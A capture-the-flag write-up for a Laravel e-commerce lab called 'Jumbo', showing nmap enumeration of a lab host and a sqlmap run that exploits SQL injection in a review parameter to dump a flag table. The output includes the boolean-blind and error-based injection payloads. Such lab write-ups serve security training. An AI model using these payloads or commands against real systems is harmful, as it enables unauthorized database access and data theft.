---
title: Jumbo
published: 2025-09-12
description: 'A developer from the marketing department is working on an e-commerce application built with Laravel. Your task as an AppSec specialist is to analyze the running application in the staging environment and spot vulnerabilities and their impact.'
image: ''
tags: ['SQL injection','Laravel','Code Review']
category: 'SECDOJO'
draft: false 
---

## Enumeration

```bash
# Nmap 7.94SVN scan initiated Fri Sep 12 09:08:18 2025 as: nmap -sCV -A -T4 -o nmap.txt 10.8.0.2
Nmap scan report for 10.8.0.2
Host is up (0.070s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f1:46:f6:cf:07:ba:8a:88:9e:fe:91:9d:33:70:29:ef (ECDSA)
|_  256 1a:14:8b:94:3e:ed:83:8c:c2:2e:47:7f:ec:84:4d:8f (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 12 09:08:29 2025 -- 1 IP address (1 host up) scanned in 10.87 seconds
```
> - Let check Web App:
![web app](./Jumbo-Images/web.png)

> - Now i can test sql injection
![sql injection](./Jumbo-Images/error.png)

## Exploitation

- I can try `sqlmap` for dump dbs:
```bash
sqlmap -u "http://10.8.0.2/customer/review?order_id=52&bmuk_no=1" \                                                                            ✔  13s  
  -p bmuk_no \
  --cookie="laravel_session=cookies; XSRF-TOKEN=xsrf cookies" \
  --dbms=mysql \
  --batch \
  --level=2 --risk=1 \
  --technique=BE \
  -D database-name -T flag -C value --dump


        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:02:41 /2025-09-12/

[10:02:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: bmuk_no (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: order_id=52&bmuk_no=1' AND 5467=5467 AND 'gStG'='gStG

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: order_id=52&bmuk_no=1' AND GTID_SUBSET(CONCAT(0x717a766a71,(SELECT (ELT(4929=4929,1))),0x71786b7071),4929) AND 'RDpn'='RDpn
---
[10:02:42] [INFO] testing MySQL
[10:02:42] [INFO] confirming MySQL
[10:02:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 8.0.0
[10:02:42] [INFO] fetching entries of column(Jumbo-v1_dedicated_19512-1n2xnkssp8qk4uz7ygjg1ipzd7yp9jlas) '`value`' for table 'flag' in database 'jumbo'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[10:02:43] [WARNING] reflective value(s) found and filtering out
[10:02:45] [INFO] retrieved: '*************************************************'
Database: **********
Table: *******
[1 entry]
+-----------------------------------------------------------+
| value                                                     |
+-----------------------------------------------------------+
| ********************************************************* |
+-----------------------------------------------------------+

[10:02:45] [INFO] table 'jumbo.flag' dumped to CSV file '/home/hijacked/.local/share/sqlmap/output/10.8.0.2/dump/jumbo/flag.csv'
[10:02:45] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[10:02:45] [INFO] fetched data logged to text files under '/home/hijacked/.local/share/sqlmap/output/10.8.0.2'
[10:02:45] [WARNING] your sqlmap version is outdated

[*] ending @ 10:02:45 /2025-09-12/
```
